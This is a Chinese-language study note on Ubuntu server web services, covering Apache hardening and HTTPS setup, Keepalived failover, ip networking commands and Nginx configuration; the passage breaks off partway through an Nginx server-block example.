class="headerlink" title="Apache中默认基本配置"></a>Apache中默认基本配置</h6><p><strong>1.索引文件index：</strong><br>DirectoryIndex<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 可以根据需求,手动修改索引页的名称（一般不建议修改）</span></span><br><span class="line"><span class="comment"># /etc/apache2/mods-available/dir.conf</span></span><br><span class="line">&lt;IfModule mod_dir.c&gt;</span><br><span class="line">    DirectoryIndex index.html index.cgi index.pl index.php index.xhtml index.htm  <span class="comment"># 有先后的执行顺序</span></span><br><span class="line">&lt;/IfModule&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Note：</span></span><br><span class="line">若没有正确放置index索引文件，会看到文件列表，可能会有安全隐患</span><br></pre></td></tr></table></figure></p><p><strong>2.html格式展示目录列表：Options</strong><br>【安全考虑】–&gt;去掉由于没有索引文件会显示文件列表的选项<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## /etc/apache2/apache2.conf   主配置文件</span></span><br><span class="line">&lt;Directory /var/www/&gt;   <span class="comment"># 对文件目录权限的配置</span></span><br><span class="line">    Options Indexes FollowSymLinks  <span class="comment"># Indexes:若没有索引文件,就会显示目录列表;去掉Indexes就不会显示列表了，提示"权限拒绝"</span></span><br><span class="line">    AllowOverride None</span><br><span class="line">    Require all granted</span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务</span></span><br></pre></td></tr></table></figure></p><p><strong>3.Permission Denied </strong><br>以上1,2两项都不匹配，就会显示”权限拒绝”</p><p><strong>4.ErrorDocument  报错提示</strong><br>【安全考虑】–&gt; 默认404或报错页面会泄露信息或扫描器，建议替换为我们自定义的页面–&gt;不告诉用户不成功的具体原因,只告诉他出错了<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/apache2/conf-available/localized-error-pages.conf  </span></span><br><span class="line">ErrorDocument 404 /error/404.html       <span class="comment"># 定义自己的页面</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务</span></span><br></pre></td></tr></table></figure></p><p>5.基于目录的Options<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## /etc/apache2/apache2.conf   主配置文件</span></span><br><span class="line">&lt;Directory /var/www/&gt; </span><br><span class="line">    Options Indexes </span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 其他配置项(权限要最小化原则，安全起见)</span></span><br><span class="line">ExecCGI<span class="comment"># 允许CGI脚本执行的目录(/usr/lib/cgi-bin)</span></span><br><span class="line">Includes<span class="comment"># 允许服务端包含（一个html包含另一个html,模板化）</span></span><br><span class="line">IncludeNOEXEC<span class="comment"># 允许包含，但进展CGI脚本exec、include</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务</span></span><br></pre></td></tr></table></figure></p><p>6.环境变量<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/apache2/envvars可以修改用户和组和pid等</span></span><br><span class="line">User /Group <span class="comment"># 服务器端应答客户端访问的账号(www-data)</span></span><br><span class="line">PidFile<span class="comment"># /var/run/apache2/apache2.pid</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 最大并发数（默认8192）</span></span><br><span class="line">APACHE_ULIMIT_MAX_FILES=<span class="string">'ulimit -n 65536'</span></span><br></pre></td></tr></table></figure></p><h4 id="模块化"><a href="#模块化" class="headerlink" title="模块化"></a>模块化</h4><p>服务器核心只实现了基本功能<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apache2 -l  <span class="comment"># 查看默认被编译到apache核心包里面的模块</span></span><br></pre></td></tr></table></figure></p><p>其他功能通过模块实现<br>ubuntu编译动态加载模块实现运行时模块调用<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">apt search libapache2-mod<span class="comment"># 搜索模块</span></span><br><span class="line">sudo apt install libapache2-mod0auth-mysql<span class="comment"># 安装模块</span></span><br><span class="line">sudo a2enmod auth_mysql<span class="comment"># 启用模块</span></span><br><span class="line">sudo a2dismod auth_mysql<span class="comment"># 禁用模块</span></span><br></pre></td></tr></table></figure></p><h4 id="开启HTTPS"><a href="#开启HTTPS" class="headerlink" title="开启HTTPS"></a>开启HTTPS</h4><p><code>传输过程中</code>的CIA (机密性、完整性、可用性)，但是不提供<code>应用层</code>安全<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/apache2/sites-available/default-ssl.conf</span></span><br><span class="line">sudo a2ensite default-ssl  <span class="comment"># 开始ssl加密(默认未启动)</span></span><br><span class="line">sudo a2ebmod ssl<span class="comment"># 默认未启动</span></span><br><span class="line"></span><br><span class="line">_default_:443<span class="comment"># 未指定虚拟主机情况下的443端口访问, 默认是443(除了其他指定了虚拟主机名的，未指定的就访问到这里)</span></span><br><span class="line">SSLEngine on<span class="comment"># 开启SSl/TSL</span></span><br><span class="line">SSLCertificateFile  /etc/ssl/certs/ssl-cert-snakeoil.pem  <span class="comment"># 证书文件(默认已经自带了一张证书)</span></span><br><span class="line">SSLCertificateKeyFile /etc/ssl/private/ssl-cert-snakeoil.key</span><br><span class="line">SSLCertificateChainFile /etc/apache2/ssl.crt/server-ca.crt  <span class="comment"># 证书的加密链文件</span></span><br><span class="line">SSLCARevocationFile /etc/apache2/ssl.crl/ca-bundle.crl      <span class="comment"># 证书吊销列表</span></span><br><span class="line">SSLVerifyClient require   <span class="comment"># 要求客户端提供证书(不可抵赖性)</span></span><br><span class="line"></span><br><span class="line">&lt;FilesMatch <span class="string">"\.(cgi|shtml|phtml|php)$"</span>&gt;   <span class="comment"># 基于文件类型，设置不同环境变量进行加密</span></span><br><span class="line">      SSLOptions +StdEnvVars</span><br><span class="line">&lt;/FilesMatch&gt;</span><br><span class="line">&lt;Directory /usr/lib/cgi-bin&gt;    <span class="comment"># 对指定目录</span></span><br><span class="line">      SSLOptions +StdEnvVars    <span class="comment"># 标准环境变量</span></span><br><span class="line">&lt;/Directory&gt;</span><br><span class="line"></span><br><span class="line">ssl-unclean-shutdown   <span class="comment"># 只是服务器端向客户端断开连接(追求速度)</span></span><br><span class="line">ssl-accurate-shutdown<span class="comment"># 服务器端与客户端的连接端口了，客户端还有向服务端再确认(追求稳定性)</span></span><br><span class="line"></span><br><span class="line">nokeepalive ssl-unclean-shutdown</span><br><span class="line">downgrade-1.0 force-response-1.0<span class="comment"># 降级响应</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 还可以按自己需要...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 启用并重启服务</span></span><br><span class="line">sudo a2ensite default-ssl</span><br><span class="line">service apache2 reload</span><br><span class="line">sudo systemctl restart apache.service</span><br><span class="line"></span><br><span class="line"><span class="comment">## 可以访问了(ubuntu自己生成的证书浏览器会提示不安全)</span></span><br></pre></td></tr></table></figure></p><h6 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h6><p>向证书颁发机构申请的合法证书就可以替换ubuntu自带的证书<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用CA机构签名证书</span></span><br><span class="line">sudo openssl req -newkey rsa:2048 -nodes -keyout server.key -out server.pem</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用自签名证书</span></span><br><span class="line">sudo openssl req -x509 -days 365 -sha256 -newkey rsa:2048 -nodes -keyout /etc/ssl/private/mysite.key -out /etc/ssl/certs/mysite.pem</span><br></pre></td></tr></table></figure></p><h6 id="创建HTTPS虚拟主机"><a href="#创建HTTPS虚拟主机" class="headerlink" title="创建HTTPS虚拟主机"></a>创建<code>HTTPS</code>虚拟主机</h6><p>和创建一般虚拟主机是类似的<br><img src="/ubuntu-server-Web服务/20200425131432963_15883.png" alt><br>建议商业证书颁发机构(权威机构颁发，默认受信，增强特性，收费高昂，有效期长)</p><p><strong>那没钱怎么办呢？</strong><br>有几家机构已经有免费的了，比如<code>Let&#39;s encrypt</code><br><strong>Let’s encrypt</strong></p><ul><li>致力于加速全文实现https的免费证书颁发机构</li><li>证书有效期90天(可刷新)</li><li>专门客户端程序 <code>Certbot</code>，简化证书步骤<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo add-apt-repository ppa:certbot/certbot  <span class="comment"># 添加仓库</span></span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install cerbot  python-cerbot-apache</span><br></pre></td></tr></table></figure></li></ul><p>使用方法：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 前提</span></span><br><span class="line">域名正常解析、设置好虚拟主机</span><br><span class="line"></span><br><span class="line"><span class="comment"># 申请证书 (--apache意思是给apache用的， -d是域名,还有子域名)</span></span><br><span class="line">sudo certbot --apache -d example.com -d www.example.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 证书位置</span></span><br><span class="line">/etc/letsencrypt/live</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看证书状态(换成自己的域名)</span></span><br><span class="line">https://www.ssllab.com/ssltest/analyze.html?d=example.com&amp;latest</span><br></pre></td></tr></table></figure></p><h4 id="Apache支持PHP"><a href="#Apache支持PHP" class="headerlink" title="Apache支持PHP"></a>Apache支持PHP</h4><p>1.安装<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install php7.2 libapache2-mod-php7.2   <span class="comment"># mod-php模块</span></span><br><span class="line"><span class="comment"># 验证 </span></span><br><span class="line">php -v</span><br></pre></td></tr></table></figure></p><p>2.启用模块<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 直接启用即可</span></span><br><span class="line">a2enmod php7.2</span><br><span class="line"></span><br><span class="line"><span class="comment"># Apache对php的支持是模块化的，而Nginx对php支持的配置方式比较原始</span></span><br></pre></td></tr></table></figure></p><p>索引文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">vim  /etc/apache2/mods-available/dir.conf       <span class="comment"># index.php</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启</span></span><br><span class="line">sudo systemctl restart apache2</span><br></pre></td></tr></table></figure></p><p>配置文件<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/etc/php/7.2/    <span class="comment"># 下面不同的目录，是针对不同应用的，这里apache的在apache子目录下面</span></span><br><span class="line">/usr/lib/php/7.2/    <span class="comment"># 为不同的使用场景的配置文件(开发环境与生产环境，一般情况下会把这里的文件链接到上面的配置中)</span></span><br></pre></td></tr></table></figure></p><h2 id="Keepalived"><a href="#Keepalived" class="headerlink" title="Keepalived"></a><font color="red">Keepalived</font></h2><p>高可用的一种解决方案：Keepalived</p><h4 id="实现高可用-HA"><a href="#实现高可用-HA" class="headerlink" title="实现高可用(HA)"></a>实现高可用(HA)</h4><ul><li>在服务器组内漂移的VIP（多台服务器实现一个组，但也是一个域名，解析到一个ip）</li><li>Master独占VIP，其他Server检查Master可用性</li><li>Keepalives并非专门针对Apache而设计</li><li>常用于负载均衡技术环境</li><li>组内服务器应提供相同内容和配置</li></ul><p>组内不同服务器有优先级，多个服务器共用一个漂移的ip地址(VIP)，处于正常状态的服务器叫Maste</p><h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install keepalived</span><br><span class="line"></span><br><span class="line"><span class="comment"># 因为无配置，所有默认启动失败</span></span><br><span class="line">/etc/keepalived/keepalived.conf<span class="comment"># 配置文件（需要创建）</span></span><br></pre></td></tr></table></figure><p>配置文件：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可选配置项，但是一般建议配置</span></span><br><span class="line">global_defs &#123;  </span><br><span class="line">    notification_email &#123;</span><br><span class="line">    myemail@mycompany.com   <span class="comment"># 发送邮件给谁</span></span><br><span class="line">    &#125;</span><br><span class="line">    notification_email_from keepalives@mycompany</span><br><span class="line">    smtp_server 192.168.1.150</span><br><span class="line">    smtp_connect_timeout 30</span><br><span class="line">    router_id mycompany_web_prod</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment"># 关键配置</span></span><br><span class="line"><span class="comment"># 1号配置实例</span></span><br><span class="line">vrrp_instance VI_1 &#123;</span><br><span class="line">    smtp_alter</span><br><span class="line">    interface enp0s3 <span class="comment"># 网卡接口优先级</span></span><br><span class="line">    virtual_router_id 51 <span class="comment"># 定义服务器组</span></span><br><span class="line">    priority 100 <span class="comment"># 优先级(自己定义，保证顺序即可)</span></span><br><span class="line">    advert_int 5 <span class="comment"># 周期性通告的间隔时间</span></span><br><span class="line">    virtual_ipaddress &#123;  </span><br><span class="line">        192.168.1.200 <span class="comment"># VIP（DHCP以外）</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启服务</span></span><br></pre></td></tr></table></figure></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">systemctl start keepalived </span><br><span class="line">systemctl status -l keeplived</span><br><span class="line"><span class="comment"># 网卡绑定VIP</span></span><br><span class="line"> ip a</span><br><span class="line"> 等待30s</span><br><span class="line"></span><br><span class="line"><span class="comment"># 安装第二台服务器，并进行类似的配置(优先级修改,vip地址填写一样的)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 模拟切换</span></span><br><span class="line">systemctl stop keepalived </span><br><span class="line">systemctl start keepalived</span><br></pre></td></tr></table></figure><p>不仅可以配合Apache使用，还可配合其他使用</p><h2 id="Ubuntu-18-04新特性"><a href="#Ubuntu-18-04新特性" class="headerlink" title="Ubuntu 18.04新特性"></a><font color="red">Ubuntu 18.04新特性</font></h2><p>哈哈哈，前几天20.04都已经正式发布了，我听课进度太慢</p><blockquote><p>内核是关键<br><img src="/ubuntu-server-Web服务/20200425142824240_1739.png" alt><br><img src="/ubuntu-server-Web服务/20200425144457182_27054.png" alt></p></blockquote><h6 id="网络配置"><a href="#网络配置" class="headerlink" title="网络配置"></a>网络配置</h6><p><img src="/ubuntu-server-Web服务/20200425145333762_14082.png" alt><br><img src="/ubuntu-server-Web服务/20200425145724172_15710.png" alt><br>多个地址，要用逗号分隔<br>重启服务：<code>sudo netplan apply</code></p><p><img src="/ubuntu-server-Web服务/20200425145944914_17134.png" alt><br>桥接的物理网卡设置为没有ip</p><p><strong>桌面端：</strong><br><img src="/ubuntu-server-Web服务/20200425150429971_9910.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ifconfig / ifup / if down  已经默认不安装了</span></span><br><span class="line"><span class="comment"># 对应上面</span></span><br><span class="line">ip link <span class="built_in">set</span> eth0 up  / ip link <span class="built_in">set</span> eth0 down</span><br></pre></td></tr></table></figure><p><strong>networkctl命令</strong><br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 此命令地位更加突出</span></span><br><span class="line">networkctl status / networkctl status eth0   <span class="comment"># 查看不同网卡的状态和详细信息</span></span><br></pre></td></tr></table></figure></p><p><strong>ip命令</strong><br>ip link<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo ip link ens33 down  <span class="comment"># down掉, 相当于ifup</span></span><br><span class="line">sudo ip link ens33 up    <span class="comment"># 启动网卡, 相当于 ifdown</span></span><br><span class="line"></span><br><span class="line">ip link ls ens33  <span class="comment"># 查看网卡的link信息</span></span><br><span class="line">ip -s -d link ls ens33  <span class="comment"># 查看网卡的link信息(更详细)</span></span><br><span class="line">ip -s -s -d link ls ens33  <span class="comment"># 查看网卡的link信息(更更详细)</span></span><br><span class="line">ip link <span class="built_in">set</span> dev ens33 mtu 1500  <span class="comment"># 修改MTU</span></span><br><span class="line">ip link <span class="built_in">set</span> dev ens33  address 00:11:22:33:44:55  <span class="comment"># 修改MAC</span></span><br></pre></td></tr></table></figure></p><p>ip addr<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ip addr    <span class="comment"># ip a</span></span><br><span class="line">ip addr show  <span class="comment"># 跟上面没什么差别</span></span><br><span class="line"></span><br><span class="line">ip addr add dev ens33 192.168.1.10/24  <span class="comment"># 手动给网卡添加ip</span></span><br><span class="line">ip addr del dev ens33 192.168.1.10/24  <span class="comment"># 手动给网卡删除ip</span></span><br><span class="line">ip addr fulsh dev ens33  <span class="comment"># 清除网卡信息</span></span><br></pre></td></tr></table></figure></p><p>ip route<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ip route show  <span class="comment"># 查看路由信息   ip route</span></span><br><span class="line">ip route get 1.1.1.1   <span class="comment"># 查看到达指定目的ip，计算要经过的路由</span></span><br><span class="line">sudo ip route default via 192.168.1.2  <span class="comment"># 添加默认路由(网关地址)</span></span><br><span class="line">sudo ip route dev ens33 2.0.0.0/8 via 192.168.1.1 <span class="comment"># 指定去往某个网络，都要经过1.1这个路由，并指定网卡进行转发</span></span><br></pre></td></tr></table></figure></p><p>ip maddress<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 组播地址</span></span><br><span class="line">ip maddress <span class="comment"># 查看所有网卡都属于哪个组播地址</span></span><br><span class="line">ip maddress ls ens33  <span class="comment"># 查看指定网卡属于哪个组播地址</span></span><br><span class="line">ip maddress add 33:33:00:00:00:01 dev ens33 <span class="comment"># 把哪个网卡加入到某个组播地址</span></span><br></pre></td></tr></table></figure></p><p>ip neighbor<br>查arp缓存<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看</span></span><br><span class="line">ip neigh</span><br><span class="line">ip -s -s neighbor show</span><br><span class="line"><span class="comment"># 手动绑定ip与mac地址（防止arp欺骗）  lladdr即逻辑链路层地址， perm是永久生效</span></span><br><span class="line">ip neighbor add dev ens33 192.168.0.131 lladdr 00:11:22:33:44:55 nud perm</span><br></pre></td></tr></table></figure></p><p>ip monitor<br>监视网络里面地址等解析的变化<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ip monitor all</span><br><span class="line"><span class="comment"># 有着不同的状态</span></span><br></pre></td></tr></table></figure></p><h2 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a><font color="red">Nginx</font></h2><ul><li>开源，轻量，快速，可扩展的Web服务器</li><li>Github, Netflix, Wordpress都基于Nginx</li><li>但是可配置能力弱于Apache</li><li>适用于大流量，高并发环境（稳定快速，占用资源少–C10K问题）</li><li>在Top 1000个网站中使用率最高</li></ul><p><strong>Apache基于线程</strong></p><ul><li>基于进程(运行中的文件就叫进程)消耗资源多</li><li>同进程下的多线程共享内存（一损俱损）</li></ul><p><strong>Nginx使用事件驱动的架构</strong></p><ul><li>新客户端请求时不创建新的进程/线程</li><li>事件处理器处理请求任务</li><li>更少的处理时间，更少的内存消耗</li></ul><p><strong>Apache与Nginx共用</strong></p><ul><li>Apache处理动态内容</li><li>Nginx处理静态内容</li></ul><h4 id="安装-2"><a href="#安装-2" class="headerlink" title="安装"></a>安装</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install nginx</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置文件在 /etc/nginx</span></span><br></pre></td></tr></table></figure><h4 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/nginx</span></span><br><span class="line"><span class="comment"># 主配置文件 nginx.conf</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 虚拟主机配置文件</span></span><br><span class="line">sites-available</span><br><span class="line">sites-enabled    <span class="comment"># 启用的，是个链接</span></span><br><span class="line"></span><br><span class="line">snippets    <span class="comment"># 可以复用的片段</span></span><br></pre></td></tr></table></figure><h6 id="主配置文件"><a href="#主配置文件" class="headerlink" title="主配置文件"></a>主配置文件</h6><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/nginx/nginx.conf</span></span><br><span class="line">user www-data;        <span class="comment"># 用户</span></span><br><span class="line">worker_processes auto;    <span class="comment"># 进程数</span></span><br><span class="line">include /etc/nginx/modules-enabled/*.conf;    <span class="comment"># 引入的模块配置</span></span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections 768;  <span class="comment"># 每个进程最大的并发连接数</span></span><br><span class="line">    <span class="comment"># multi_accept on;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    sendfile on;    <span class="comment"># 对内核 静态资源的访问速度(都要开着)</span></span><br><span class="line">    tcp_nopush on;    <span class="comment"># 优化了对tcp协议栈性能(优化了数据包的大小,多个小包变成大包再发)</span></span><br><span class="line">    tcp_nodelay on;   <span class="comment"># 与上面的参数相反(从发包的延时进行优化,来一个包就发)</span></span><br><span class="line">    keepalive_timeout 65;        <span class="comment"># 没一个TCP连接最大的保活的时间</span></span><br><span class="line">    types_hash_max_size 2048;    <span class="comment"># MIME类型镜头内容hash表大小</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">##</span></span><br><span class="line">    <span class="comment"># Virtual Host Configs</span></span><br><span class="line">    <span class="comment">##</span></span><br><span class="line">    include /etc/nginx/conf.d/*.conf;</span><br><span class="line">    include /etc/nginx/sites-enabled/*;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="虚拟主机配置文件"><a href="#虚拟主机配置文件" class="headerlink" title="虚拟主机配置文件"></a>虚拟主机配置文件</h6><p>ip和端口一样，使用不同域名来指向不同站点<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># /etc/nginx/sites-available/    # 可用站点</span></span><br><span class="line"><span class="comment"># /etc/nginx/sites-enabled/      # 已启用站点</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># /etc/nginx/sites-available/default</span></span><br><span class="line">server&#123;</span><br><span class="line">    listen 80 default_server;    <span class="comment"># 侦听的端口</span></span><br><span class="line">    root /var/www/htmll;    <span class="comment"># 根目录</span></span><br><span class="line">    index index.html index.htm index.nginx-debian.html;    <span class="comment"># 索引文件</span></span><br><span class="line">    server_name www.xpsshuai.cn;    <span class="comment"># 主机名(域名)</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">location / &#123;    <span class="comment"># 主url</span></span><br><span class="line">    <span class="comment"># First attempt to serve request as file, then</span></span><br><span class="line">    <span class="comment"># as directory, then fall back to displaying a 404.</span></span><br><span class="line">    try_files <span class="variable">$uri</span> <span class="variable">$uri</span>/ =404;    <span class="comment"># 资源没有就404</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="新建虚拟主机-Server-Blocks-实例"><a href="#新建虚拟主机-Server-Blocks-实例" class="headerlink" title="新建虚拟主机(Server Blocks)实例"></a>新建虚拟主机(Server Blocks)实例</h4><blockquote><p>Nginx中叫<code>服务器块</code>，但东西跟Apache中虚拟主机是一样的</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir /var/www/qq.com</span><br><span class="line"><span class="comment"># 每个单独的Server Block一个配置文件</span></span><br><span class="line">sudo cp /etc/nginx/sites-available/default  /etc/nginx/sites-available/qq.com</span><br><span class="line">sudo vim /etc/nginx/sites-available/qq.com </span><br><span class="line"><span class="comment"># 